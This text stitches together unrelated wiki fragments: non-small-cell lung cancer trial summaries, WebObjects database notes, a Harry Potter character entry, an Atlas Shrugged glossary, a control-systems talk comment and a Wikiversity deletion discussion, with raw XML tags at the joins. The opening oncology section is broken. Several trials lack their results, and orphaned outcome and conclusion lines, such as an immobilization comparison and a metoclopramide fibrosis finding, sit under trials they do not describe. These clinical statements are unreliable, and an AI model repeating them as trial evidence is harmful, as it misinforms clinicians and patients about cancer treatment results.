***Outcome: 5-year OS chemo 44% vs. 40% control (SS); DFS 39% vs. 34% (SS). Also benefit for local control, distant control. However, no OS benefit on Stage I subset analysis (HR 0.95, NS)
***Toxicity: 1% died due to chemo effects
***Conclusion: Cisplatin-based adjuvant chemo improves survival
**'''2006''' PMID 16957145 -- &quot;DNA repair by ERCC1 in non-small-cell lung cancer and cisplatin-based adjuvant chemotherapy.&quot; (Olaussen KA, N Engl J Med. 2006 Sep 7;355(10):983-91.)
***Expression of ERCC1. 761 tumors analyzed. 44% positive, 56% negative
***ERCC1 negative: 5-year OS 47% chemo vs. 39% control (SS). Median OS 56 months chemo vs. 40 months control (14 month benefit)
***ERCC1 positive: 5-year OS 40% chemo vs. 46% control (NS). Median OS 50 months chemo vs. 55 months control (NS)

***Toxicity: ACP faster to set up and more comfortable by patients (SS)
***Conclusion: Abdominal compression superior to Bodyfix in immobilization and patient comfort

==Advanced Stage Operable NSCLC==
===Induction Chemo vs Induction Chemo-RT===
*'''German GLCCG''' (1995-2003) -- Induction cisplatin/etoposide then concurrent chemo-RT then surgery vs. induction cisplatin/etoposide then postop RT
**Randomized. 524 patients with NSCLC Stage IIIA (33%) or resectable IIIB (67%). Arm 1) Induction cisplatin 55 mg/m2 + etoposide 100 mg/m2 x3 cycles, then concurrent RT 45/30 in 1.5 Gy BID with carboplatin 100 mg/m2 + vindesine 3mg, followed by surgery vs. Arm 2) Same induction, followed by surgery, followed by RT (54/30 if R0, 68.4/38. Surgery after 4-6 weeks. Primary endpoint PFS

***Toxicity: If pneumonectomy (35% in both groups), worse mortality 14% vs. 6%
***Conclusion: Preop chemo-RT increases mediastinal downstaging, but doesn't improve survival. After induction, pneumonectomy should be avoided

===Prophylactic Cranial Irradiation (PCI)===
*'''German Multicenter''' (1994-2001)
**''Terminated early due to slow accrual after benefit of adjuvant chemo shown. '' Randomized. 112 patients with operable Stage IIIA NSCLC based on mediastinoscopy staging.

==Unresectable==
===RT vs. Placebo===
*'''VA Lung Group (VALG)''' -- RT vs. placebo vs. chemotherapy
**Randomized, 3 arms. 800 patients. Localized but inoperable (mostly due to bulky disease). KPS 80-100 33%, KPS 50-70 55%. Arm 1) RT vs. Arm 2) placebo (lactose) vs. Arm 3) chemo (not reported here). RT given: orthovolatage in 90% (200-260 kV), Cobalt-60 in 10%. Target dose 40-50 Gy, but 33% received &lt;40 Gy (2/3 died, 1/3 medical complications)
**'''1968''' PMID 4170866 -- &quot;The survival of patients with inoperable lung cancer: a large-scale randomized study of radiation therapy versus placebo.&quot; (Roswit B, Radiology. 1968 Apr;90(4):688-97.)
***Outcome: Median OS: RT 4.6 months vs. placebo 3.7 months (NS); 1-year survival: RT 18% vs. placebo 14% (p=0.05). 
***Long-term survivors (top 25%): RT 10 monts vs. 7.6 months (SS). Better survival if longer symptomatic prior to diagnosis, suggesting slower rate of growth

**Randomized. 366 patients with unresectable Stage III NSCLC. Randomized to Arm 1) Concurrent carboplatin (AUC=2)/paclitaxel (50 mg/sq m) with RT 66 Gy. Arm 2) Induction with carboplatin(AUC=6)/paclitaxel (200 mg/sq m) x2 cycles, then concurrent chemo-RT as Arm 1
**'''2007''' PMID 17404369 -- &quot;Induction chemotherapy followed by chemoradiotherapy compared with chemoradiotherapy alone for regionally advanced unresectable stage III Non-small-cell lung cancer: Cancer and Leukemia Group B.&quot; (Vokes EE, J Clin Oncol. 2007 May 1;25(13):1698-704.)
***Outcome: MS induction 12 months vs. no induction 14 months (NS); 2-year OS 29% vs. 31% (NS)
***Toxicity: Induction chemo neutropenia (20% Grade 3-4), no difference between concurrent  CRT arms
***Conclusion: Addition of induction chemo added toxicity without survival benefit.
**Comment: Low survival compared to other trials, possibly due to lower chemo dose due to using carboplatin and not cisplatin.

===Chemo-RT +/- chemotherapy consolidation===
*'''Hoosier Oncology Group''' (2002-2006) -- Chemo-RT +/- docetaxel
**Randomized. ''Stopped early due to interim analysis of futility.'' 147/203 patients with stage IIIA-B, FEV1 &gt;=1 L, wt loss &lt;5%. Concurrent RT 59.4 Gy with cisplatin/etoposide, then if no progression Arm 1) docetaxel 75 mg/m2 x3 cycles vs. Arm 2) observation

***Outcome: Lung density increased with dose (SS). Patients on metoclopramide less increase in tissue density (SS)
***Conclusion: Metoclopramide and large radiation dose seemed to protect against fibrosis development

==Metastatic==
*'''Japan WJTOG 3405'''
**Randomized. 172 chemo-naive patients, age &lt;=75, Stage IIIB/IV NSCLC or postop recurrence, with EGRF mutation (exon 19 deletion or L858R point mutation). Arm 1) Gefitinib 250 mg QD vs Arm 2) cisplatin 80 mg/m2 and docetaxel 60 mg/m2 Q3W x 3-6 cycles. Primary endpoint PFS

      <text xml:space="preserve">The contents of this wikibook are out of date and have now moved to http://wiki.objectstyle.org/confluence/display/WO/Home. 

WebObjects was initially created at Next. There was a framework called DBKit, which provided a way to abstract legacy databases to an object-relational graph. This framework later became the Enterprise Objects Framework.

EOF was used to build nibware, runnable applications for NextStep/OpenStep that were built with Project Builder and which used interfaces that were designed in Interface Builder. If this sounds familiar, it is because the ideas from that time have only been refined, and not fundamentally changed, to become the Cocoa frameworks for applications running on Mac OS X today.

WebObjects was built on top of DBKit/EOF to provide a way to create applications for the World Wide Web. The first versions of WebObjects were created at Next around the latter half of 1992.

(This information can be fleshed out and corrected when the information from the 2007 WWDC is more widely available.)

      <text xml:space="preserve">Entity inheritance is a way to take advantage of the object-relational mapping layer between the [[Programming:WebObjects/EOF/Modeling/Entities|EOEntity]] objects and the table structure in the database to provide flexibility. This flexibility can also become a source of problems, so care must be taken when using this feature. There are many tricks available from the flexibility this feature provides.

There are three kinds of entity inheritance that represent different ways to map a table or tables to an entity or entities. 

==Single-Table Inheritance==

In single-table inheritance, a single table can be used for more than one entity. The most sure way to do this is to use a column, or a set of columns, that have ordinal values.

An example would be:

&lt;table border=&quot;1&quot;&gt;
&lt;caption&gt;Table: Sellables&lt;/caption&gt;
&lt;tr&gt;&lt;th&gt;pk&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;cost&lt;/th&gt;&lt;th&gt;objType&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;1&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;Corvette&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;50000&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;2&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;Volkswagen&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;10000&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;3&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;Piper Cub&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;50000&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;4&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;Lear Jet&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;100000&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;

One can create two entities. In one entity, called &quot;Cars&quot;, the external name would be &quot;Sellables&quot; and there would be a restricting qualifier saying that &quot;objType = 1&quot;. For another entity, called &quot;Planes&quot;, the external name would also be &quot;Sellables&quot; and there would be a restricting qualifier saying that &quot;objType = 2&quot;.

When instances of the Cars or the Planes entity are created, one must make sure to set the objType attribute. It is often simplest to have custom EO classes for the entities that can handle the initiation reliably.

==Horizontal Inheritance==



==Vertical Inheritance==

== Overview ==

'''''Antonin Dolohov''''' is a Death Eater with a long, pale, twisted face who was convicted of the brutal murders of Gideon and Fabian Prewett and imprisoned in Azkaban.

== Role in the Books ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

=== [[Muggles' Guide to Harry Potter/Books/Goblet of Fire|Goblet of Fire]] ===

When [[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]] was viewing [[Muggles' Guide to Harry Potter/Characters/Albus Dumbledore|Albus Dumbledore]]'s memories in the [[Muggles' Guide to Harry Potter/Magic/Pensieve|Pensieve]], he saw a session where [[Muggles' Guide to Harry Potter/Characters/Igor Karkaroff|Igor Karkaroff]] was naming Death Eaters while trying to bargain for a shorter sentence. One of the names he provided was that of Dolohov; [[Muggles' Guide to Harry Potter/Characters/Bartemius Crouch Sr.|Bartemius Crouch]], who was presiding over the Wizengamot at that point, said that they had already apprehended Dolohov.

=== [[Muggles' Guide to Harry Potter/Books/Order of the Phoenix|Order of the Phoenix]] ===

Dolohov broke out of the wizard prison with [[Muggles' Guide to Harry Potter/Characters/Bellatrix Lestrange|Bellatrix Lestrange]], [[Muggles' Guide to Harry Potter/Characters/Augustus Rookwood|Augustus Rookwood]], and seven other convicted Death Eaters. 

In the [[Muggles' Guide to Harry Potter/Major Events/Battle at the Department of Mysteries|Battle at the Department of Mysteries]], Dolohov and [[Muggles' Guide to Harry Potter/Characters/Jugson|Jugson]] had cornered [[Muggles' Guide to Harry Potter/Characters/Hermione Granger|Hermione]], [[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]], and [[Muggles' Guide to Harry Potter/Characters/Neville Longbottom|Neville]], and Hermione [[Muggles' Guide to Harry Potter/Magic/Silencio|Silenced]] him when he tried to call out their location to bring the other Death Eaters. After Jugson had been [[Muggles' Guide to Harry Potter/Magic/Petrificus Totalus|Petrified]], Dolohov seriously injured Hermione with a curse in the form of a streak of purple flame, broke Neville's wand and nose, and ended up Petrified by Harry. Later re-animated, he was in the battle in the room of the Veil, where he was again Petrified by Harry.

=== [[Muggles' Guide to Harry Potter/Books/Half-Blood Prince|Half-Blood Prince]] ===

When [[Muggles' Guide to Harry Potter/Characters/Lord Voldemort|Lord Voldemort]], or [[Muggles' Guide to Harry Potter/Characters/Tom Marvolo Riddle|Tom Riddle]] as he is then known, is seen in [[Muggles' Guide to Harry Potter/Characters/Albus Dumbledore|Albus Dumbledore]]'s memories returning to Hogwarts to apply for the job of teacher of Defence Against the Dark Arts, Dumbledore asks him about his &quot;friends&quot; waiting for him in Hogsmeade. Dolohov is one of the friends mentioned by name, along with [[Muggles' Guide to Harry Potter/Characters/Mulciber|Mulciber]], [[Muggles' Guide to Harry Potter/Characters/Nott|Nott]], and [[Muggles' Guide to Harry Potter/Characters/Evan Rosier|Evan Rosier]].

=== [[Muggles' Guide to Harry Potter/Books/Deathly Hallows|Deathly Hallows]] ===

When Harry, Ron, and Hermione escape from the Weasley wedding and head for Tottenham Court Road, they are tracked there by two Death Eaters, Dolohov and [[Muggles' Guide to Harry Potter/Characters/Thorfinn Rowle|Thorfinn Rowle]]. Rowle is [[Muggles' Guide to Harry Potter/Magic/Stupefy|Stunned]] by Harry from the concealment of his [[Muggles' Guide to Harry Potter/Magic/Invisibility Cloak|Invisibility Cloak]]; Dolohov is [[Muggles' Guide to Harry Potter/Magic/Petrificus Totalus|Petrified]] by Hermione. They both then have their [[Muggles' Guide to Harry Potter/Magic/Obliviate|memory modified]] by Hermione.

In the first part of the [[Muggles' Guide to Harry Potter/Major Events/Battle of Hogwarts|battle of Hogwarts]], as Harry, Ron and Hermione make their way invisibly through the Entrance Hall on their way to the Shrieking Shack, they pass Dolohov who is dueling with [[Muggles' Guide to Harry Potter/Characters/Dean Thomas|Dean Thomas]]. [[Muggles' Guide to Harry Potter/Characters/Peeves|Peeves]] drops a [[Muggles' Guide to Harry Potter/Magic/Snargaluff|Snargaluff pod]] on Ron's head. Distracted by this, Dolohov is Petrified by [[Muggles' Guide to Harry Potter/Characters/Parvati Patil|Parvati Patil]], who is also there dueling with [[Muggles' Guide to Harry Potter/Characters/Travers|Travers]]. In an interview after the publication of the final book, the author stated that it was Dolohov who killed [[Muggles' Guide to Harry Potter/Characters/Remus Lupin|Remus Lupin]] in the Battle of Hogwarts.

When Harry heads for the [[Muggles' Guide to Harry Potter/Places/Forbidden Forest|Forbidden Forest]] to meet Voldemort, Dolohov is one of the two guards that he follows; the other is [[Muggles' Guide to Harry Potter/Characters/Yaxley|Yaxley]].

== Strengths ==
He seems to be a very skilled wizard in terms of dueling and the Dark Arts. He was powerful enough to defeat Moody and Remus on separate occasions and almost defeated [[Muggles' Guide to Harry Potter/Characters/Sirius Black|Sirius Black]] before Harry hit him with a spell from behind.

== Weaknesses ==
He has been known to be somewhat easily distracted on a few occasions.

== Relationships with Other Characters ==

      <text xml:space="preserve">This page summarizes some significant things from the novel&amp;mdash;from symbols to laws to songs to legends.

==Anti-dog-eat-dog Rule==
The Anti-dog-eat-dog Rule is passed by the National Alliance of Railroads in [[../Structure|section]] 145, allegedly to prevent &quot;destructive competition&quot; between [[w:railroad|railroad]]s.  The rule gives the Alliance the authority to forbid competition between railroads in certain parts of the country.  It was crafted by [[w:Characters in Atlas Shrugged#Orren Boyle|Orren Boyle]] as a favor for [[w:Characters in Atlas Shrugged#James Taggart|James Taggart]], with the purpose of driving the [[../Companies#Phoenix-Durango|Phoenix-Durango]] out of [[w:Places in Atlas Shrugged#Colorado|Colorado]].

==Bracelet==
The very first thing made from ''Rearden metal'' is a bracelet.  The bracelet is used to illustrate Rand's [[w:Atlas Shrugged#Theory of sex|theory of sex]].

The bracelet symbolizes the value created by [[w:Characters in Atlas Shrugged#Hank Rearden|Hank Rearden]]'s long struggle to invent Rearden metal.  When he gives it to [[w:Characters in Atlas Shrugged#Lillian Rearden|Lillian Rearden]] as a present in section 121 she says, &quot;It's fully as valuable as a piece of railroad rails.&quot;  However, Lillian fully grasps the significance of the gift; her snide remark is her way of denigrating her husband's ethos.

In section 161, Lillian wears this bracelet at a party thrown on her anniversary.  She makes fun of it all night long, and when [[w:Dagny Taggart|Dagny Taggart]] hears Lillian say she would gladly trade it for a common diamond bracelet, Dagny takes her up on it.

Lillian later asks for it back upon realizing her power over her husband was slowly diminishing.  Dagny declines the offer.

At the end of the book, the bracelet is one of the very few things Dagny takes with her when she finally departs New York and gives up the futile effort to preserve her company.

The bracelet appears in [[../Structure|sections]] 121 and 161.

==Cigarettes with Gold Dollar Sign==
Cigarettes stamped with a golden dollar symbol $ (instead of a brand name) turn up from time to time in the story. Rand used cigarettes as a metaphor for humanity's conquest of fire. To Rand, cigarettes are a symbol of humanity's first great technological achievement. In ''Atlas Shrugged'',

&lt;blockquote&gt;He produced a package of cigarettes and extended it to her [...] It was a plain white package that bore, as a single imprint, the sign of the dollar [...] There was no printing on the package, no trade name, no address, only the dollar sign stamped in gold. The cigarettes bore the same sign.&lt;/blockquote&gt;

Ayn Rand chose a cigarette to represent money and capitalism partially because of its connotation of fire, and the significance of that to themes of ''Atlas Shrugged''.

&lt;blockquote&gt;In the early 1970s Rand’s health began to give way. An enthusiastic smoker, she was diagnosed with lung cancer.  For Rand, smoking was a Promethean symbol of creativity, inventiveness, profit-making, all she most admired: &quot;When a man thinks, there is a spot of fire alive in his mind – and it is proper that he should have the burning point of a cigarette as his one expression,&quot; one of the goodies explains in Atlas Shrugged.

[After her death] a six-foot-high floral dollar sign was erected by her open coffin in the funeral home.&lt;ref&gt;Turner, Jenny. [http://www.lrb.co.uk/v27/n23/turn03_.html As Astonishing as Elvis in the '''London Review of Books''']&lt;/ref&gt;&lt;/blockquote&gt;

==Equalization of Opportunity Bill==
A bill designed by the [[w:Characters in Atlas Shrugged#Looters|Looters]] that proposes to limit the number of businesses any one person can own to one.  It is aimed primarily at [[w:Characters in Atlas Shrugged#Hank Rearden|Hank Rearden]], who uses [[w:Companies in Atlas Shrugged#Rearden Ore|Rearden Ore]] to guarantee [[../Companies#Rearden Steel|Rearden Steel]] a supply of iron ore.  By passing this Bill, the Looters can seize Rearden's other businesses for themselves, and then deny him the iron he needs to run his steel mills.

The Looters claim the Bill is meant to give a chance to the little guy.

The Equalization of Opportunity Bill appears in [[../Structure|section]] 161.

==Halley's Fifth Concerto==
[[w:Characters in Atlas Shrugged#Richard Halley|Richard Halley]] disappeared after he had written only four concertos.  In [[../Structure|section]] 112, [[w:Dagny Taggart|Dagny Taggart]], an enthusiastic fan of Halley's music, hears an unfamiliar theme being whistled by a [[w:Characters in Atlas Shrugged#Brakeman|brakeman]] on the Taggart Comet.  She asks him what it is; he responds by telling her that it is Halley's Fifth Concerto.  When Dagny says Halley only wrote four concertos, the brakeman says he made a mistake and denies knowing what the song was.

Later, Dagny calls [[w:Characters in Atlas Shrugged#Minor characters|Mr. Ayers]] to find out if Halley wrote a fifth concerto. Ayers says Halley did not.

Halley's Fifth Concerto is mentioned in [[../Structure|sections]] 112, 114 and 152.

==Halley's Fourth Concerto==
The last thing [[w:Characters in Atlas Shrugged#Richard Halley|Richard Halley]] wrote before he disappeared.  It is a song of rebellion and defiance that seemed to say agony and suffering were not necessary.  Its main theme is the [[w:Greek myth|Greek myth]] of [[w:Phaethon|Phaethon]].  However, Phaethon succeeds in riding his father's chariot.  [[w:Characters in Atlas Shrugged#Dagny Taggart|Dagny Taggart]] listened to this piece in [[../Structure|section]] 141.

It is mentioned in [[../Structure|section]] 152.

==''Heaven's In Your Backyard''==
A film.  [[w:Characters in Atlas Shrugged#Mort Liddy|Mort Liddy]] wrote the score, using a bastardized version of ''Halley's Fourth Concerto''.  It is mentioned in [[../Structure|section]] 161.

==John Galt legends==
Since everyone across the country is asking, &quot;Who is John Galt?&quot;, it is not surprising that some people have come up with answers.  A number of John Galt Legends are told, each of which, ironically, turns out to be true, at least symbolically.

; Legend one ([[../Structure|section]] 161):  A [[w:Characters in Atlas Shrugged#Minor characters|spinster]] at [[w:Characters in Atlas Shrugged#Lillian Rearden|Lillian Rearden's]] party tells [[w:Dagny Taggart|Dagny]] the story.  John Galt was a man of inestimable wealth who found the sunken island of [[w:Atlantis|Atlantis]] while fighting the worst storm ever wreaked upon the world.  The sight was so beautiful that, having seen it, he could never go back to the world, so he sank his ship and took his fortune down with him.

; Legend two : John Galt found the elixir of life on the top of a mountain and was never seen again.

Francisco d'Anconia claims that the spinster told the truth.

The actual John Galt was a man who created something of inestimable value, a new motor, and who discovered the secret to what was wrong with the world while fighting the most evil social philosophy ever put into practice.  The world he envisioned was so beautiful that he refused to live in the world that was, and disappeared, taking the secret of his motor with him.

Atlantis, the Isles of the Blessed, is a place where no one could enter except those who had the spirit of a hero.  Described in these terms, it is the same as ''Galt's Gulch''.  Galt describes the reality of the situation as the story that is &quot;concretely true&quot; implying the others are true in a metaphorical sense.

==National Alliance of Railroads==
An industry group formed to promote the welfare of the industry as a whole, requiring members to sacrifice their individual interests for the common good.  [[w:Characters in Atlas Shrugged#Orren Boyle|Orren Boyle]] has friends on the National Alliance of Railroads, and he gets them to support the Anti-dog-eat-dog Rule, which uses a string of pretenses to drive the [[../Companies#Phoenix-Durango|Phoenix-Durango]] out of [[w:Places in Atlas Shrugged#Colorado|Colorado]].

The National Alliance of Railroads is mentioned in [[../Structure|sections]] 131, 145 and 146.

==National Council of Metal Industries==
An industry group that uses political pull to get its way. [[w:Characters in Atlas Shrugged#James Taggart|James Taggart]] has friends on the National Council of Metal Industries, and he gets them to support legislation that will hurt [[../Companies#Rearden Steel|Rearden Steel]] and help [[../Companies#Associated Steel|Associated Steel]].

The National Council of Metal Industries is mentioned in [[../Structure|section]] 131.

==Taggart Comet==
The Taggart Comet is [[../Companies#Taggart Transcontinental|Taggart Transcontinental's]] flagship train.  It runs from [[../Places#New York|New York]] to [[../Places#San Francisco|San Francisco]], and has never been late until the later part of the book, when the entire world is in the process of collapse. In the final chapter, [[w:Characters in Atlas Shrugged#Eddie Willers|Eddie Willers]] makes a futile last effort to get the Comet back on track, which ends with his being stranded in the middle of the desert with the broken-down train.

The Taggart Comet appears in [[../Structure|sections]] 112, 113 and 152.

==The future==
See [[w:Characters in Atlas Shrugged#Bertram Scudder|Bertram Scudder]].

==''The Heart Is A Milkman''==
''The Heart is a Milkman'' is a novel being written by [[w:Characters in Atlas Shrugged#Balph Eubank|Balph Eubank]].  It is about the central fact of human existence, frustration.  Eubank says he will dedicate it to [[w:Characters in Atlas Shrugged#Lillian Rearden|Lillian Rearden]].

It is mentioned in [[../Structure|section]] 161.

==The Octopus==
A newspaper editorial written by [[w:Characters in Atlas Shrugged#Bertram Scudder|Bertram Scudder]]. It is anti-Rearden and is described as badly written, being merely a string of insults.

==''The Vulture Is Molting''==
A best-selling novel that captures the spirit of the times, ''The Vulture Is Molting'' is &quot;A penetrating study of a businessman's greed.  A fearless revelation of man's depravity.&quot;  The book is mentioned in [[../Structure|section]] 141 as one of the artifacts of [[w:popular culture|popular culture]] that depresses [[w:Dagny Taggart|Dagny Taggart]] with its baseness.

      <text xml:space="preserve">You totally forgot gain and phase margins, two of the most important metrics.


Hi it is stated in the Control Systems book that

&quot;Proper Systems
A proper system is a system where the degree of the denominator is larger than or equal to the degree of the numerator polynomial. A strictly proper system is a system where the degree of the denominator polynomial is larger then (but never equal to) the degree of the numerator polynomial.

It is important to note that only proper systems can be physically realized. In other words, a system that is not proper cannot be built. It makes no sense to spend alot of time designing and analyzing imaginary systems.&quot;

So depending on what is explained here the transfer function &quot;s&quot; or &quot;s/1&quot; which is equal to a diffentiator is an improper system. So does that mean that we can not phsically realize a differentiator?

I hope you can clarify this because I am also hesitant.

      <text xml:space="preserve">== [[Wikiversity]] ==

{{Closed|1=&lt;span style=&quot;background:red; color:white&quot;&gt;closed&lt;/span&gt;: What Darklama said below. It seems discussion has stagnated on this, and no objections to what DL said have been raised in a month. It seems consensus is to keep pages deemed to have historical value, delete pages that have been moved, and then allow the Wikiversity custodians to move what has not. [[User:Mattb112885|Mattb112885]] &lt;small&gt; ([[User talk:Mattb112885|talk]]) &lt;/small&gt; 20:36, 1 July 2007 (UTC)}}

I'm proposing the deletion of [[Special:Prefixindex/Wikiversity|all Wikiversity pages]] and their related pages on this project as having been transwiki to a more appropriate wiki. From what I understand 6 months to move everything was originally requested and 6 months ended on Feb 15th, 2007. One Wikiversity custodian (thats an admin for anyone unfamiliar with Wikiversity terminology), I talked to about it, is satisfied that everything of importance has been imported. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 03:48, 30 March 2007 (UTC)

:'''Comment''' - '''''proceed with caution''''' as it appears that some people are still contributing to the Wikiversity pages here, e.g. [http://en.wikibooks.org/w/index.php?title=Wikiversity:School_of_Very_Small_Information_Systems/SS2007&amp;action=history]. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 09:03, 30 March 2007 (UTC)
:'''Comment''' - I do agree this should go (and having been saying so for sometime).  However can we get Johnny's views on whether this is now OK - I know he had some dates a while back for this to become possible --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 12:29, 7 April 2007 (UTC)
:'''Comment''' -- I wish we could have gotten the &quot;scrapbook&quot; concept off the ground for this kind of thing, since a lot of the old WV material can probably be incorporated into other books or made into &quot;substantial&quot; stubs for topics where there is no other textbook. A lot of it really is fodder for the dustbin though, and as far as people still contributing to WV materials here on wikibooks, they shouldn't be doing so, and perhaps we should come up with a template message to alert contributors about the new project. The only thing I'd ask is that people do a search on wikiversity before marking for delete, and if nothing along the lines of the topic already exists on wv, maybe leave me a not on my talk page so I can import it (Special:Import is enabled from Wikibooks, and I am &lt;s&gt;an admin&lt;/s&gt; a Custodian there.--[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 13:57, 7 April 2007 (UTC)
:'''Comment''' - A two phase transition process could be used. The first phase could involve speedy deleting all pages which haven't had any recent activity and minimizing the main Wikiverity page and include the usual impending doom notice on it. Also add impending doom notice to all pages which still have activity on it and try to notify the contributors. The second phase would involve deleting what remains of it after contributors have been notified and any wanted material has been imported to Wikiversity, merged into an existing book or turned into a more appropriate textbook. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:17, 7 April 2007 (UTC)
:'''Request''': An attempt was made to mark Wikiversity pages when they were copied to Wikiversity. When the Wikiversity pages are deleted, if any additional Wikiversity pages are found that are not marked as having been moved to Wikiversity, please list them at [[v:Wikiversity:Import]] and give us a chance to import the pages before they are deleted. --[[User:JWSchmidt|JWSurf]] 16:06, 22 April 2007 (UTC)
:'''Keep''' - Wikiversity is being linked by many external sites to wikibooks domain. Academic papers, like [http://www.profetic.org/dossiers/article.php3?id_article=973 this one] link here. What could be made is blanking the pages with a link to the new location. --[[User:Javier Carro|Javier Carro]] 05:35, 1 May 2007 (UTC)
:'''Comment'''. I just tried to import [[Wikiversity]] to [[v:Wikiversity:Wikiversity]] and learned that there is a bug in the page import function. Apparently the bug prevents all of the page history from being imported if the page has a long history of edits. I was told that it might be much later this year before the bug is fixed. Until we can capture the full history of the [[Wikiversity]] page at the Wikiversity website, please do not delete this one page. I agree with, Javier: rather than delete the [[Wikiversity]] page why not make it a soft redirect to another page such as [http://www.wikiversity.org/ www.wikiversity.org]? --[[User:JWSchmidt|JWSurf]] 17:12, 10 May 2007 (UTC)
::If I understand correctly, this isn't exactly a &quot;bug&quot;, but rather an intended limit. I'd like to ask a bug request that allows re-import from &quot;all versions later than...&quot;, so that multi-stage imports could be performed without overstressing the servers. I'm guessing they just want to avoid people trying to export/import extremely long-historied pages such as [[w:Main Page]], which might have hundreds of thousands of edits. --[[User:SB_Johnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SB_Johnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 10:10, 19 May 2007 (UTC)
* '''Comment''' - I would lean towards keeping at least the page [[Wikiversity]]. It seems to me that it shows that there is some historical significance of Wikiversity at Wikibooks, and also, if updated could allow for and encourage greater collaboration between the two projects. However, it does seem like more than one or two considerate and thoughtful pages on Wikiversity may not be in Wikibook's best interest. --[[User:Remi|Remi]] 05:53, 28 May 2007 (UTC)
*:How about renaming the main [[Wikiversity]] page to [[Wikibooks:Wikiversity]], and move these &quot;historical&quot; pages out of the main namespace?  The discussion on the talk page of [[Talk:Wikiversity]] is very critical in terms of the history of Wikiversity, and the relationship between Wikiversity and Wikibook.  This seems to be a huge deal right now with some of the other language Wikibooks projects, where arguments seem to be going on to define this difference, and the full impact of Wikiversity hasn't been explored in as much depth as it has with en.wikiversity.  Certainly a major disclaimer/warning notice ought to be on the top of this page, letting people reading the page know it ''really is'' an historical page and not a current active part of Wikibooks.  I do agree that this page in particular perhaps ought to be saved here too for the reason that the links to user accounts (while many of the same users did create accounts on Wikiversity using the same name), would put the user names into the correct context.  Also, most of the links (especially on the talk page) are made in context with Wikibooks and not Wikiversity.  I see that some of the links have been changed to Wikiversity for content that was Wikiversity related, but the point still holds.  Similar historical pages about Wikibooks on Wikipedia still exist at Wikipedia.  --[[User:Robert Horning|Rob Horning]] 17:50, 30 May 2007 (UTC)
::Getting it out of the main namespace seems reasonable to me, especially considering the state of the current page. The page &quot;[[Wikiversity]]&quot; isn't exactly a book. --[[User:Remi|Remi]] 15:19, 2 June 2007 (UTC)
* '''Comment''' - Ok, If I understand correctly, the consensus so far seems to be to keep the main page for &quot;historical&quot; reasons, delete everything that has been marked as having already been imported to Wikiversity, and than delete everything else once the Wikiversity custodians have imported everything else that might be wanted? --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 12:23, 2 June 2007 (UTC)

More like ''Evolution Theory For Schizophrenics'', this is more POV and original research from the author of [[#Reggy|Reggy]] and [[#Jaccuse|Jaccuse]]. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 03:48, 19 June 2007 (UTC)
:The author, [[User:Ohadaloni]], has indicated on my [[User talk:Webaware#Hi There|talk page]] that he/she will review NPOV and original research policies.

*'''Delete''' - More of the same. --[[User:Jomegat|Jomegat]] 04:15, 19 June 2007 (UTC)
*'''Delete''' - Not a book. A collection of personal musings, perhaps. Still, not appropriate for Wikibooks or Wikijunior. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 17:00, 19 June 2007 (UTC)
